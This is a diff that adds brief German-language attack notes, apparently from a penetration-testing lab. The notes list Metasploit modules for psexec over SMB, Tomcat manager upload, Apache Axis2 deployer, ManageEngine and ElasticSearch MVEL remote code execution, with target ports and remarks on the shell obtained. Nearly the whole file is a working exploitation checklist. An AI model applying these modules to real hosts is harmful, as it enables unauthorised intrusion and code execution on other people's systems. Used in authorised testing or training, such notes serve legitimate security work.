@@ -1,0 +1,31 @@
+Portscanner
+
+
+psexec/SMB
+use exploits/windows/smb/psexec
+
+Alles möglich
+
+
+Tomcat // Java Exploit -> wenig möglichkeiten Angriff zu erweitern. Upload/Download
+use exploits/multi/http/tomcat_mgr_upload
+set RHOST
+set RPORT 8282
+
+Apache Axis2 
+use exploit/multi/http/axis2_deployer
+set RPORT 8282
+Upload/Download -> Execute
+shell ohne admin
+
+
+ManageEngine
+use exploit/windows/http/manageengine_connectionid_write
+set RPORT 8020
+Upload -> Execute
+shell ohne admin
+
+
+ElasticSearch?
+use exploit/multi/elasticsearch/script_mvel_rce
+set RPORT 9200
